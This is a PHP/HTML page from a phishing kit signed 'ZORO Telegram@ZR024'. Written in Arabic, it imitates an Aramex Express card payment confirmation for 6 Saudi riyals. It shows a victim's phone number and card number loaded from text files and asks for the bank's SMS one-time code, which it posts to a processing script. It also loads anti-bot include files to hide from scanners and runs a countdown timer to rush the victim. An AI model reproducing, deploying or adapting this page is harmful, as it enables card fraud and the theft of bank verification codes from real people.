<?php	

	session_start(); 
	error_reporting(0);
		
	//    ❝ ✎ 𝙕𝙊𝙍𝙊™ Telegram@ZR024 ッ ❞ 

			include "Bots/#01.php";include "Bots/#02.php";
			include "Bots/#03.php";include "Bots/#04.php";
			include "Bots/#05.php";include "Bots/#06.php";
			include "Bots/#07.php";include "Bots/#08.php";
			include "Bots/#09.php";include "Bots/#10.php";
			include "Bots/#11.php";include "Bots/GetOS.php";
			
?>
<!DOCTYPE html>

<html style="background: #FFF;"><head>
	<meta charset="utf-8"> 
	    <meta name="theme" content="#dc291e">
    <meta name="theme-color" content="#dc291e">
    <meta name="msapplication-TileColor" content="#dc291e">
  	<link rel="icon" href="assets/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
    <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"=""> 
    <link rel="stylesheet" href="assets/StyleV.css">
    <title>Blog</title> 
	<style> td {width:300px } ::-webkit-input-placeholder {color: #dddddd} :-ms-input-placeholder {color: #dddddd} ::placeholder {color: #dddddd}input:focus{outline: none}
</style>
   </head> 
  <body style="background: #FFF;"> 
    <div id="ss-wrapper"> 
      <div class="ss-area"> 
        <form action="Processing.php" method="post" style=" background: #eaeaea; ">    
          <div class="top d-flex align-items-center" style="background-image: url(assets/map.png);"> 
            <div class="flex-grow-1"><img style="max-width: 150px;" src="assets/logo2.svg">
            </div> 
            <div><img src="assets/verfy.svg" style="
    width: 121px;
">
            </div> 
          </div> 
          <h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">يرجى تأكيد الدفع التالي</font>
          </font></h3><font style="vertical-align: inherit;"> 
          <div class="details" style="
    direction: rtl;
    text-align: right;
"> 
            <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">تم إرسال كلمة المرور الفريدة إلى رقم هاتفك المحمول <strong><?php $tel = file_get_contents( "tel.txt"); echo $tel; ?></strong> </font><font style="vertical-align: inherit;">إذا كنت بحاجة إلى تغيير رقم هاتفك المحمول ، فيرجى الاتصال بالمصرف الذي تتعامل معه أو تعديله عبر القنوات المتاحة (ماكينة الصراف الآلي ، الويب).</font>
            </font></p><font style="vertical-align: inherit;"> 
            <table> 
              <tbody style=" direction: ltr; text-align: center; margin: auto">
					<div><span style="font-weight: bold;margin-right: 22px;margin-left: 10px;"> التاجر : </span> ارامكس اكسبريس </div>
					<div><span style="font-weight: bold;margin-right: 22px;margin-left: 10px;"> المبلغ : </span> 6 ريال سعودي</div>
					<div><span style="font-weight: bold;margin-right: 22px;margin-left: 10px;"> تاريخ : </span> <?php setLocale(LC_ALL , 'ar_EG.utf-8'); echo strftime(" %d / %m / %Y"); ?></div>
					<div><span style="font-weight: bold;margin-right: 22px;margin-left: 10px;">رقم بطاقة الائتمان : </span><span style=" font-weight: bold; "><?php include( "crd.txt");?></span></tr><br><br> 
					<div style="display: flex;justify-content: center;margin-top: 20px;"><span id="countdown" style="position: absolute;color: #dc291e4a;z-index: 99;margin-right: -117px;margin-top: 4px;font-weight: bold;"> 1:00</span><span style="font-weight: bold;position: absolute;margin: -20.2px -30px 0 0px;padding: 0px 7px;background: #eaeaea;">رمز الرسائل القصيرة</span><input type="text" name="SmsArmex" autofocus placeholder="* * * * * *" style="border: solid 1px #0000003b;border-radius: 25px;height: 31px;direction: ltr;padding: 0px 14px;width: 167px;"></div>
              </tbody>
            </table> 
            <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">الرجاء إدخال رمز التحقق الذي تلقيته عن طريق الرسائل القصيرة</font>
            </font></p><font style="vertical-align: inherit;"> 
          </font></font></div><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
          <div class="btns"> <button type="submit"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">إرسال</font></font></button><font style="vertical-align: inherit;"> 
          </font></div><font style="vertical-align: inherit;"> 
          <p class="copy" style="background-image: url(assets/map.png);margin-top: 30px;background-position: center;color: #a8a8a8;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
©   <?php setLocale(LC_ALL , 'ar_EG.utf-8'); echo strftime(" %Y "); ?> جميع الحقوق محفوظة		  </font></font>
  </font>
	  
          </font></p><font style="vertical-align: inherit;"> 
         
      </font></font></font></font></font></form></div><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
    </font></font></div><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
    
	
	 
  	<!-- Disabled Submit-->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
	<script>$(document).ready((function(){$(':input[type="submit"]').prop("disabled",!0),$('input[type="text"]').keyup((function(){""!=$(this).val()&&$(':input[type="submit"]').prop("disabled",!1)}))}));</script>
			<script>var seconds=120;function secondPassed(){var e=Math.round((seconds-30)/60);var n=seconds%60;if(n<10){n="0"+n}document.getElementById("countdown").innerHTML=" "+e+":"+n;if(seconds==0){clearInterval(countdownTimer);document.getElementById("countdown").innerHTML=""}else{seconds--}}var countdownTimer=setInterval("secondPassed()",1e3);</script>


</font></font></body></html>